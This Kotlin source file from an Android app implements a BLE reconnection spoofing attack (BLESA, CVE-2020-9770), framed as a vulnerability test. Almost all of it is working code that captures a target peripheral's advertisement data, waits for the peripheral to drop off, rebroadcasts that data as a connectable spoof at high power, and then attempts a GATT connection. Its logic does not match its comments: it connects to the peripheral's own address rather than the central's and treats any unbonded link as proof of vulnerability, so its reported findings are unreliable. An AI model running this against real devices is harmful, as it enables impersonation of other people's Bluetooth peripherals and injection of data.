package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothGattService
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.bluetooth.le.BluetoothLeScanner
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanFilter
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout

/**
 * BLESA (BLE Spoofing Attack on Reconnections) module.
 *
 * Tests whether a BLE central device properly authenticates peripherals during
 * reconnection. The BLE specification makes authentication during reconnection
 * optional, meaning a central may accept a spoofed peripheral without
 * re-authenticating the connection.
 *
 * Attack flow:
 * 1. Scan for the target peripheral's BLE advertisements to capture its
 *    advertisement data (service UUIDs, manufacturer data, device name).
 * 2. Wait for the target peripheral to disconnect from its central.
 * 3. Immediately begin advertising with the captured advertisement data,
 *    spoofing the peripheral's identity.
 * 4. Attempt a GATT connection to the central as the spoofed peripheral.
 * 5. Check whether the central accepts the reconnection without
 *    re-authentication, indicating vulnerability to BLESA.
 *
 * This module does NOT require root -- it uses standard Android BLE APIs
 * (BluetoothLeScanner, BluetoothLeAdvertiser, BluetoothGatt) which operate
 * entirely in userspace.
 *
 * @property context The application context, required to access system Bluetooth services.
 */
class BlesaModule(private val context: Context) {

    companion object {
        private const val TAG = "BlesaModule"

        /** Timeout for initial scan to capture advertisement data, in milliseconds. */
        private const val SCAN_TIMEOUT_MS = 30_000L

        /** Timeout for waiting for the peripheral to disconnect, in milliseconds. */
        private const val DISCONNECT_WAIT_TIMEOUT_MS = 60_000L

        /** Timeout for GATT connection attempt to the central, in milliseconds. */
        private const val GATT_CONNECT_TIMEOUT_MS = 15_000L

        /** Duration to advertise spoofed data before attempting connection, in milliseconds. */
        private const val SPOOF_ADVERTISE_DURATION_MS = 5_000L

        /** Interval between disconnect-detection scans, in milliseconds. */
        private const val DISCONNECT_POLL_INTERVAL_MS = 2_000L
    }

    private val bluetoothManager =
        context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val bluetoothAdapter = bluetoothManager.adapter
    private var scanner: BluetoothLeScanner? = bluetoothAdapter?.bluetoothLeScanner
    private var advertiser: BluetoothLeAdvertiser? = bluetoothAdapter?.bluetoothLeAdvertiser

    @Volatile
    private var isRunning = false

    private var activeScanCallback: ScanCallback? = null
    private var activeAdvertiseCallback: AdvertiseCallback? = null
    private var activeGatt: BluetoothGatt? = null

    /**
     * Starts the BLESA reconnection spoofing test against a target device.
     *
     * @param targetDevice The BLE peripheral to spoof.
     * @param context Android context for Bluetooth API access.
     * @return A Flow emitting progress logs throughout the attack.
     */
    @SuppressLint("MissingPermission")
    fun startAttack(targetDevice: TargetDevice, context: Context): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        isRunning = true

        emit("Initializing BLESA Reconnection Spoofing Test...")
        emit("Target: ${targetDevice.name ?: "Unknown Device ($mac)"}")
        emit("Target MAC: $mac")
        emit("Protocol: ${targetDevice.protocol}")

        // Pre-flight checks
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            emit("ERROR: Bluetooth is not enabled.")
            isRunning = false
            return@flow
        }

        scanner = bluetoothAdapter.bluetoothLeScanner
        advertiser = bluetoothAdapter.bluetoothLeAdvertiser

        if (scanner == null) {
            emit("ERROR: BLE Scanner not available.")
            isRunning = false
            return@flow
        }

        if (advertiser == null) {
            emit("ERROR: BLE Advertiser not available. Device may not support peripheral mode.")
            isRunning = false
            return@flow
        }

        emit("BLE Scanner and Advertiser initialized.")
        emit("")

        // Phase 1: Scan for the target's advertisement data
        emit("=== Phase 1: Capturing Target Advertisement Data ===")
        emit("Scanning for advertisements from $mac...")

        val capturedData = captureAdvertisementData(mac)

        if (!isRunning) {
            emit("Attack stopped by user.")
            return@flow
        }

        if (capturedData == null) {
            emit("ERROR: Could not capture advertisement data from target.")
            emit("Ensure the target device is advertising and within range.")
            isRunning = false
            return@flow
        }

        emit("Advertisement data captured successfully.")
        emit("  Device Name: ${capturedData.deviceName ?: "(none)"}")
        emit("  Service UUIDs: ${capturedData.serviceUuids.ifEmpty { listOf("(none)") }}")
        emit("  Manufacturer Data Entries: ${capturedData.manufacturerDataEntries.size}")
        emit("  TX Power Level: ${capturedData.txPowerLevel ?: "(not advertised)"}")
        emit("")

        // Phase 2: Monitor for disconnection
        emit("=== Phase 2: Monitoring for Target Disconnection ===")
        emit("Waiting for $mac to disappear from scan results...")
        emit("(This indicates the peripheral has disconnected from its central.)")

        val disconnected = waitForDisconnection(mac)

        if (!isRunning) {
            emit("Attack stopped by user.")
            return@flow
        }

        if (!disconnected) {
            emit("TIMEOUT: Target did not disconnect within ${DISCONNECT_WAIT_TIMEOUT_MS / 1000}s.")
            emit("The peripheral may still be connected to its central.")
            isRunning = false
            return@flow
        }

        emit("Target peripheral appears to have disconnected.")
        emit("")

        // Phase 3: Spoof the peripheral's advertisement
        emit("=== Phase 3: Spoofing Peripheral Advertisement ===")
        emit("Broadcasting spoofed advertisement data...")

        val spoofSuccess = startSpoofedAdvertisement(capturedData)

        if (!isRunning) {
            stopSpoofedAdvertisement()
            emit("Attack stopped by user.")
            return@flow
        }

        if (!spoofSuccess) {
            emit("ERROR: Failed to start spoofed advertisement.")
            isRunning = false
            return@flow
        }

        emit("Spoofed advertisement active for ${SPOOF_ADVERTISE_DURATION_MS / 1000}s...")
        delay(SPOOF_ADVERTISE_DURATION_MS)
        emit("Spoofed advertisement broadcast complete.")
        emit("")

        // Phase 4: Attempt GATT reconnection as the spoofed peripheral
        emit("=== Phase 4: Testing Reconnection Authentication ===")
        emit("Attempting GATT connection to central as spoofed peripheral...")

        val reconnectionResult = attemptReconnection(mac, context)

        // Stop the spoofed advertisement
        stopSpoofedAdvertisement()

        if (!isRunning) {
            emit("Attack stopped by user.")
            return@flow
        }

        // Phase 5: Analyze results
        emit("")
        emit("=== BLESA Reconnection Test Results ===")
        when (reconnectionResult) {
            ReconnectionResult.ACCEPTED_NO_AUTH -> {
                emit("VULNERABLE: Central accepted reconnection WITHOUT re-authentication.")
                emit("The target central does not verify the peripheral's identity on reconnect.")
                emit("This is consistent with the BLESA vulnerability (CVE-2020-9770).")
                emit("An attacker could impersonate the peripheral and inject malicious data.")
                Log.w(TAG, "BLESA vulnerability confirmed on $mac")
            }
            ReconnectionResult.ACCEPTED_WITH_AUTH -> {
                emit("SECURE: Central accepted reconnection but required re-authentication.")
                emit("The target properly validates peripheral identity on reconnect.")
            }
            ReconnectionResult.REJECTED -> {
                emit("SECURE: Central rejected the spoofed reconnection attempt.")
                emit("The target enforces peripheral authentication on reconnect.")
            }
            ReconnectionResult.CONNECTION_FAILED -> {
                emit("INCONCLUSIVE: Could not establish GATT connection to central.")
                emit("The central may have reconnected to the real peripheral first,")
                emit("or may not be accepting connections at this time.")
            }
            ReconnectionResult.TIMEOUT -> {
                emit("INCONCLUSIVE: GATT connection attempt timed out.")
                emit("The central may be out of range or not listening for reconnections.")
            }
        }

        emit("")
        emit("BLESA test completed.")
        isRunning = false
    }

    /**
     * Scans for the target device and captures its advertisement data.
     *
     * @param mac The target device's MAC address.
     * @return Captured advertisement data, or null if the scan timed out.
     */
    @SuppressLint("MissingPermission")
    private suspend fun captureAdvertisementData(mac: String): CapturedAdvertisement? {
        return withContext(Dispatchers.IO) {
            val resultDeferred = CompletableDeferred<CapturedAdvertisement?>()

            val scanCallback = object : ScanCallback() {
                override fun onScanResult(callbackType: Int, result: ScanResult) {
                    if (!isRunning) return
                    val device = result.device ?: return
                    if (device.address.equals(mac, ignoreCase = true)) {
                        val record = result.scanRecord
                        val captured = CapturedAdvertisement(
                            deviceName = device.name ?: record?.deviceName,
                            macAddress = mac,
                            serviceUuids = record?.serviceUuids?.map { it.toString() } ?: emptyList(),
                            manufacturerDataEntries = extractManufacturerData(record),
                            txPowerLevel = record?.txPowerLevel?.takeIf { it != Int.MIN_VALUE },
                            rssi = result.rssi
                        )
                        resultDeferred.complete(captured)
                    }
                }

                override fun onScanFailed(errorCode: Int) {
                    Log.e(TAG, "Scan failed with error code: $errorCode")
                    resultDeferred.complete(null)
                }
            }

            activeScanCallback = scanCallback

            val scanFilter = ScanFilter.Builder()
                .setDeviceAddress(mac)
                .build()

            val scanSettings = ScanSettings.Builder()
                .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
                .build()

            try {
                scanner?.startScan(listOf(scanFilter), scanSettings, scanCallback)

                val result = withTimeout(SCAN_TIMEOUT_MS) {
                    resultDeferred.await()
                }

                scanner?.stopScan(scanCallback)
                activeScanCallback = null
                result
            } catch (e: Exception) {
                Log.e(TAG, "Error during advertisement capture: ${e.message}")
                try {
                    scanner?.stopScan(scanCallback)
                } catch (_: Exception) { }
                activeScanCallback = null
                null
            }
        }
    }

    /**
     * Extracts manufacturer-specific data entries from a scan record.
     */
    private fun extractManufacturerData(
        record: android.bluetooth.le.ScanRecord?
    ): List<ManufacturerDataEntry> {
        if (record == null) return emptyList()
        val entries = mutableListOf<ManufacturerDataEntry>()
        val sparseArray = record.manufacturerSpecificData ?: return entries
        for (i in 0 until sparseArray.size()) {
            val manufacturerId = sparseArray.keyAt(i)
            val data = sparseArray.valueAt(i)
            entries.add(ManufacturerDataEntry(manufacturerId, data.toList()))
        }
        return entries
    }

    /**
     * Monitors scan results to detect when the target peripheral stops advertising,
     * indicating it has disconnected from its central.
     *
     * @param mac The target device's MAC address.
     * @return true if the target disappeared (disconnected), false on timeout.
     */
    @SuppressLint("MissingPermission")
    private suspend fun waitForDisconnection(mac: String): Boolean {
        return withContext(Dispatchers.IO) {
            val startTime = System.currentTimeMillis()
            var lastSeenTime = System.currentTimeMillis()
            var targetVisible = true

            while (isRunning &&
                (System.currentTimeMillis() - startTime) < DISCONNECT_WAIT_TIMEOUT_MS
            ) {
                val scanDeferred = CompletableDeferred<Boolean>()
                var found = false

                val scanCallback = object : ScanCallback() {
                    override fun onScanResult(callbackType: Int, result: ScanResult) {
                        val device = result.device ?: return
                        if (device.address.equals(mac, ignoreCase = true)) {
                            found = true
                            lastSeenTime = System.currentTimeMillis()
                        }
                    }

                    override fun onBatchScanResults(results: MutableList<ScanResult>) {
                        for (result in results) {
                            val device = result.device ?: continue
                            if (device.address.equals(mac, ignoreCase = true)) {
                                found = true
                                lastSeenTime = System.currentTimeMillis()
                            }
                        }
                    }

                    override fun onScanFailed(errorCode: Int) {
                        scanDeferred.complete(false)
                    }
                }

                val scanSettings = ScanSettings.Builder()
                    .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
                    .build()

                val scanFilter = ScanFilter.Builder()
                    .setDeviceAddress(mac)
                    .build()

                try {
                    found = false
                    scanner?.startScan(listOf(scanFilter), scanSettings, scanCallback)
                    delay(DISCONNECT_POLL_INTERVAL_MS)
                    scanner?.stopScan(scanCallback)

                    if (!found && targetVisible) {
                        // Target was visible but is no longer advertising
                        // Wait one more poll cycle to confirm it's truly gone
                        val confirmDeferred = CompletableDeferred<Boolean>()
                        var confirmedGone = true

                        val confirmCallback = object : ScanCallback() {
                            override fun onScanResult(callbackType: Int, result: ScanResult) {
                                val device = result.device ?: return
                                if (device.address.equals(mac, ignoreCase = true)) {
                                    confirmedGone = false
                                }
                            }

                            override fun onScanFailed(errorCode: Int) {
                                confirmDeferred.complete(true)
                            }
                        }

                        scanner?.startScan(listOf(scanFilter), scanSettings, confirmCallback)
                        delay(DISCONNECT_POLL_INTERVAL_MS)
                        scanner?.stopScan(confirmCallback)

                        if (confirmedGone) {
                            return@withContext true
                        }
                    }

                    targetVisible = found
                } catch (e: Exception) {
                    Log.e(TAG, "Error during disconnect monitoring: ${e.message}")
                    try { scanner?.stopScan(scanCallback) } catch (_: Exception) { }
                    delay(DISCONNECT_POLL_INTERVAL_MS)
                }
            }

            false
        }
    }

    /**
     * Starts broadcasting a spoofed advertisement that mimics the target peripheral.
     *
     * @param capturedData The advertisement data captured from the real peripheral.
     * @return true if advertising started successfully.
     */
    @SuppressLint("MissingPermission")
    private suspend fun startSpoofedAdvertisement(capturedData: CapturedAdvertisement): Boolean {
        return withContext(Dispatchers.IO) {
            val successDeferred = CompletableDeferred<Boolean>()

            val settings = AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(true) // Must be connectable for the central to reconnect
                .build()

            val dataBuilder = AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .setIncludeTxPowerLevel(false)

            // Replay captured manufacturer data
            for (entry in capturedData.manufacturerDataEntries) {
                dataBuilder.addManufacturerData(entry.manufacturerId, entry.data.toByteArray())
            }

            // Replay captured service UUIDs
            for (uuidStr in capturedData.serviceUuids) {
                try {
                    dataBuilder.addServiceUuid(ParcelUuid.fromString(uuidStr))
                } catch (e: Exception) {
                    Log.w(TAG, "Could not add service UUID $uuidStr: ${e.message}")
                }
            }

            val advertiseData = dataBuilder.build()

            // Build scan response with device name if available
            val scanResponseBuilder = AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .setIncludeTxPowerLevel(false)

            capturedData.deviceName?.let { name ->
                // Cannot directly set a custom name in the scan response via standard API,
                // but we include any remaining data to maximize fidelity.
                Log.d(TAG, "Target device name: $name (local name spoofing limited by API)")
            }

            val callback = object : AdvertiseCallback() {
                override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                    Log.d(TAG, "Spoofed advertisement started successfully")
                    successDeferred.complete(true)
                }

                override fun onStartFailure(errorCode: Int) {
                    val reason = when (errorCode) {
                        ADVERTISE_FAILED_DATA_TOO_LARGE -> "data too large"
                        ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> "too many advertisers"
                        ADVERTISE_FAILED_ALREADY_STARTED -> "already started"
                        ADVERTISE_FAILED_INTERNAL_ERROR -> "internal error"
                        ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> "feature unsupported"
                        else -> "error code $errorCode"
                    }
                    Log.e(TAG, "Spoofed advertisement failed: $reason")
                    successDeferred.complete(false)
                }
            }

            activeAdvertiseCallback = callback

            try {
                advertiser?.startAdvertising(settings, advertiseData, callback)
                withTimeout(5_000L) { successDeferred.await() }
            } catch (e: Exception) {
                Log.e(TAG, "Error starting spoofed advertisement: ${e.message}")
                false
            }
        }
    }

    /**
     * Stops the spoofed advertisement if one is active.
     */
    @SuppressLint("MissingPermission")
    private fun stopSpoofedAdvertisement() {
        activeAdvertiseCallback?.let { callback ->
            try {
                advertiser?.stopAdvertising(callback)
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping spoofed advertisement: ${e.message}")
            }
            activeAdvertiseCallback = null
        }
    }

    /**
     * Attempts a GATT connection to test whether the central accepts the
     * spoofed peripheral's reconnection without re-authentication.
     *
     * @param mac The target device's MAC address.
     * @param context Android context for GATT connection.
     * @return The result of the reconnection attempt.
     */
    @SuppressLint("MissingPermission")
    private suspend fun attemptReconnection(mac: String, context: Context): ReconnectionResult {
        return withContext(Dispatchers.IO) {
            try {
                val adapter = bluetoothManager.adapter ?: return@withContext ReconnectionResult.CONNECTION_FAILED
                val device = adapter.getRemoteDevice(mac)

                val connectionDeferred = CompletableDeferred<ReconnectionResult>()

                val gattCallback = object : BluetoothGattCallback() {
                    override fun onConnectionStateChange(
                        gatt: BluetoothGatt,
                        status: Int,
                        newState: Int
                    ) {
                        when (newState) {
                            BluetoothProfile.STATE_CONNECTED -> {
                                Log.d(TAG, "GATT connected to target, discovering services...")
                                // Connection accepted -- now discover services to check if
                                // the central is treating us as an authenticated peripheral
                                gatt.discoverServices()
                            }
                            BluetoothProfile.STATE_DISCONNECTED -> {
                                if (status == BluetoothGatt.GATT_SUCCESS) {
                                    connectionDeferred.complete(ReconnectionResult.REJECTED)
                                } else {
                                    connectionDeferred.complete(ReconnectionResult.CONNECTION_FAILED)
                                }
                            }
                        }
                    }

                    override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            val services = gatt.services
                            Log.d(TAG, "Services discovered: ${services.size} services")

                            // If we can discover services, the central accepted our connection
                            // Check bond state to determine if authentication was required
                            val bondState = device.bondState
                            if (bondState == BluetoothDevice.BOND_BONDED) {
                                connectionDeferred.complete(ReconnectionResult.ACCEPTED_WITH_AUTH)
                            } else {
                                // Connected and services discovered without bonding --
                                // central did not re-authenticate
                                connectionDeferred.complete(ReconnectionResult.ACCEPTED_NO_AUTH)
                            }
                        } else {
                            connectionDeferred.complete(ReconnectionResult.REJECTED)
                        }
                    }
                }

                activeGatt = device.connectGatt(
                    context,
                    false, // autoConnect=false for immediate connection attempt
                    gattCallback,
                    BluetoothDevice.TRANSPORT_LE
                )

                val result = try {
                    withTimeout(GATT_CONNECT_TIMEOUT_MS) {
                        connectionDeferred.await()
                    }
                } catch (e: Exception) {
                    ReconnectionResult.TIMEOUT
                }

                // Cleanup GATT connection
                activeGatt?.let { gatt ->
                    try {
                        gatt.disconnect()
                        gatt.close()
                    } catch (e: Exception) {
                        Log.w(TAG, "Error closing GATT: ${e.message}")
                    }
                }
                activeGatt = null

                result
            } catch (e: SecurityException) {
                Log.w(TAG, "SecurityException during reconnection attempt: ${e.message}")
                ReconnectionResult.CONNECTION_FAILED
            } catch (e: Exception) {
                Log.e(TAG, "Error during reconnection attempt: ${e.message}")
                ReconnectionResult.CONNECTION_FAILED
            }
        }
    }

    /**
     * Stops any running attack and releases resources.
     */
    @SuppressLint("MissingPermission")
    fun stopAttack() {
        isRunning = false

        // Stop any active scan
        activeScanCallback?.let { callback ->
            try {
                scanner?.stopScan(callback)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping scan: ${e.message}")
            }
            activeScanCallback = null
        }

        // Stop any spoofed advertisement
        stopSpoofedAdvertisement()

        // Close any active GATT connection
        activeGatt?.let { gatt ->
            try {
                gatt.disconnect()
                gatt.close()
            } catch (e: Exception) {
                Log.w(TAG, "Error closing GATT: ${e.message}")
            }
            activeGatt = null
        }
    }

    /**
     * Cleans up all resources. Call when the module is no longer needed.
     */
    fun close() {
        stopAttack()
    }
}

/**
 * Data class holding advertisement data captured from the target peripheral.
 */
data class CapturedAdvertisement(
    val deviceName: String?,
    val macAddress: String,
    val serviceUuids: List<String>,
    val manufacturerDataEntries: List<ManufacturerDataEntry>,
    val txPowerLevel: Int?,
    val rssi: Int
)

/**
 * A single manufacturer-specific data entry from a BLE advertisement.
 */
data class ManufacturerDataEntry(
    val manufacturerId: Int,
    val data: List<Byte>
)

/**
 * Result of the BLESA reconnection spoofing test.
 */
enum class ReconnectionResult {
    /** Central accepted reconnection without re-authentication -- VULNERABLE. */
    ACCEPTED_NO_AUTH,
    /** Central accepted reconnection but required re-authentication -- secure. */
    ACCEPTED_WITH_AUTH,
    /** Central explicitly rejected the spoofed reconnection. */
    REJECTED,
    /** Could not establish a GATT connection to the central. */
    CONNECTION_FAILED,
    /** GATT connection attempt timed out. */
    TIMEOUT
}
